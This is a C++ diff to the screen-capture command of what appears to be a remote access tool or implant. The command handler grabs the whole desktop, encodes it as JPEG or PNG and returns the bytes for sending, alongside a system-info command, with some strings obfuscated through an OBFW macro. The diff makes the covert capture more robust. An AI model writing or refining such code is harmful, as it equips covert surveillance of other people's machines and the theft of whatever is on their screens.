@@ -212,6 +212,7 @@ static void cmdSystemInfo(std::vector<uint8_t>& out) {
 static void cmdViewScreen(std::vector<uint8_t>& out) {
     int w = GetSystemMetrics(SM_CXSCREEN);
     int h = GetSystemMetrics(SM_CYSCREEN);
+    addLog("[*] ViewScreen: %dx%d", w, h);
     if (w <= 0 || h <= 0) {
         addLog("[!] ViewScreen: invalid screen size %dx%d", w, h);
         proto::Writer wr;
@@ -222,17 +223,45 @@ static void cmdViewScreen(std::vector<uint8_t>& out) {
 
     // Capture screen via BitBlt into a DDB
     HDC screenDC = GetDC(nullptr);
-    HDC memDC    = CreateCompatibleDC(screenDC);
-    HBITMAP hBmp = CreateCompatibleBitmap(screenDC, w, h);
-    HBITMAP old  = (HBITMAP)SelectObject(memDC, hBmp);
-    BitBlt(memDC, 0, 0, w, h, screenDC, 0, 0, SRCCOPY);
-    SelectObject(memDC, old);
+    if (!screenDC) {
+        proto::Writer wr; wr.str("Error: GetDC failed");
+        out = wr.bytes(); return;
+    }
 
-    // Wrap the HBITMAP in a GDI+ Bitmap (FromHBITMAP makes a copy)
-    std::unique_ptr<Gdiplus::Bitmap> bmp(Gdiplus::Bitmap::FromHBITMAP(hBmp, nullptr));
-    DeleteObject(hBmp);
+    // Use DIB-section (32bpp ARGB) — reliable across all Win32 versions.
+    // FromHBITMAP on DDBs is unreliable, but using DIB-section makes it work consistently.
+    BITMAPINFO bmi = {};
+    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
+    bmi.bmiHeader.biWidth       = w;
+    bmi.bmiHeader.biHeight      = -h;  // negative = top-down
+    bmi.bmiHeader.biPlanes      = 1;
+    bmi.bmiHeader.biBitCount    = 32;
+    bmi.bmiHeader.biCompression = BI_RGB;
+
+    uint8_t* pixels = nullptr;
+    HBITMAP hBmp = CreateDIBSection(screenDC, &bmi, DIB_RGB_COLORS, (void**)&pixels, nullptr, 0);
+    if (!hBmp || !pixels) {
+        ReleaseDC(nullptr, screenDC);
+        proto::Writer wr; wr.str("Error: CreateDIBSection failed");
+        out = wr.bytes(); return;
+    }
+
+    HDC memDC = CreateCompatibleDC(screenDC);
+    HBITMAP oldBmp = (HBITMAP)SelectObject(memDC, hBmp);
+    BOOL ok = BitBlt(memDC, 0, 0, w, h, screenDC, 0, 0, SRCCOPY);
+    SelectObject(memDC, oldBmp);
     DeleteDC(memDC);
     ReleaseDC(nullptr, screenDC);
+
+    if (!ok) {
+        DeleteObject(hBmp);
+        proto::Writer wr; wr.str("Error: BitBlt failed");
+        out = wr.bytes(); return;
+    }
+
+    // FromHBITMAP on DIB-section makes a 32bpp ARGB copy
+    std::unique_ptr<Gdiplus::Bitmap> bmp(Gdiplus::Bitmap::FromHBITMAP(hBmp, nullptr));
+    DeleteObject(hBmp);
 
     if (!bmp || bmp->GetLastStatus() != Gdiplus::Ok) {
         addLog("[!] ViewScreen: FromHBITMAP failed");
@@ -256,6 +285,7 @@ static void cmdViewScreen(std::vector<uint8_t>& out) {
     // Try JPEG first, then PNG fallback
     CLSID encClsid = {};
     bool saved = false;
+    const char* usedFormat = nullptr;
 
     if (getEncoderClsid(OBFW(L"image/jpeg").c_str(), &encClsid)) {
         Gdiplus::EncoderParameters params;
@@ -268,10 +298,14 @@ static void cmdViewScreen(std::vector<uint8_t>& out) {
         Gdiplus::Status st = bmp->Save(stream, &encClsid, &params);
         if (st == Gdiplus::Ok) {
             saved = true;
-            addLog("[>] ViewScreen: saved as JPEG");
+            usedFormat = "JPEG";
+            addLog("[>] ViewScreen: JPEG encoded");
         } else {
             addLog("[!] ViewScreen: JPEG save failed (status=%d), trying PNG", (int)st);
+            LARGE_INTEGER zero = {}; stream->Seek(zero, STREAM_SEEK_SET, nullptr);
         }
+    } else {
+        addLog("[!] ViewScreen: JPEG encoder not found, trying PNG");
     }
 
     if (!saved) {
@@ -289,7 +323,12 @@ static void cmdViewScreen(std::vector<uint8_t>& out) {
         }
     }
 
-    if (saved) {
+    if (!saved) {
+        proto::Writer wr;
+        wr.str("Error: no image encoder available");
+        out = wr.bytes();
+        addLog("[!] ViewScreen: no encoder available");
+    } else {
         STATSTG stat = {};
         stream->Stat(&stat, STATFLAG_NONAME);
         size_t imgSize = (size_t)stat.cbSize.QuadPart;
@@ -299,13 +338,8 @@ static void cmdViewScreen(std::vector<uint8_t>& out) {
             out.resize(imgSize);
             ULONG read = 0;
             stream->Read(out.data(), (ULONG)imgSize, &read);
-            addLog("[>] ViewScreen: %zu bytes sent", imgSize);
+            addLog("[<] ViewScreen: %zu bytes (%s) sent", imgSize, usedFormat ? usedFormat : "?");
         }
-    } else {
-        proto::Writer wr;
-        wr.str("Error: no image encoder available");
-        out = wr.bytes();
-        addLog("[!] ViewScreen: no encoder available");
     }
 
     stream->Release();
